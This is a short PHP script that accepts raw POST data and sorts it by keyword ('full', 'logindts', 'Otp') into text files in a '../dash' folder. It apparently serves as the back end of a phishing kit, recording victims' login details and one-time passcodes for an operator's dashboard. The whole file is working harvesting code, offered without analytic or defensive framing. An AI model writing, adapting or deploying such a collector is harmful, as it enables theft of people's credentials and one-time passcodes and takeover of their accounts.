<?php

@session_start();

// Read the XML post data
$postData = file_get_contents('php://input');

// Check if XML post data contains 'full'
if (strpos($postData, 'full') !== false) {
    // Write data to full.txt
    $wordToRemove = "|full";
$newWord = str_replace($wordToRemove, "", $postData);
file_put_contents('../dash/full.txt', "\n" . $newWord, FILE_APPEND);

    
} 
// Check if XML post data contains 'logindts'
elseif (strpos($postData, 'logindts') !== false) {
    // Write data to logindts.txt
    
file_put_contents('../dash/logindts.txt', "\n" . $postData, FILE_APPEND);

} 
// Check if XML post data contains 'Otp'
elseif (strpos($postData, 'Otp') !== false) {
    // Write data to otp.txt
	file_put_contents('../dash/otp.txt', "\n" . $postData, FILE_APPEND);

} 
else {
    // Data doesn't match any condition
    echo "No matching keyword found.";
}

?>
